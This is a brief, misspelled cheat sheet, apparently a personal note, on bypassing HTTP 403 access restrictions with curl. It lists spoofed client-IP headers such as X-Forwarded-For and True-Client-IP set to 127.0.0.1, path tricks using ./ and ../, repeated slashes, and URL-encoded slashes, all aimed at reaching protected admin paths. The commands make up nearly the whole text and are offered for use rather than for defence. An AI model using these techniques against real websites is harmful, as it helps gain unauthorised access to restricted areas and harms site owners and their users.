# 403 Bypass Authontacation

# Method 1————————————-

```
use curl headers 
-H "X-Forwarded-For: 127.0.0.1" (fack IP) Some websites block based on your real IP.
-H "X-Client-IP: 127.0.0.1"
-H "X-Real-IP: 127.0.0.1"
-H "Forwarded: for=127.0.0.1"
-H "True-Client-IP: 127.0.0.1"
```

# Method 2————————————-

```
use .(dot) between directory 
curl "https://127.0.0.1/secure/./admin"
curl "https://127.0.0.1/secure/../admin"
```

# Method 3—————————————

```
this will hepl to bypass directorys btw endpoint
curl "http://127.0.0.1///admin"

also tru url encoding to bypass 
curl "http://127.0.0.1/hiddde%2f"
```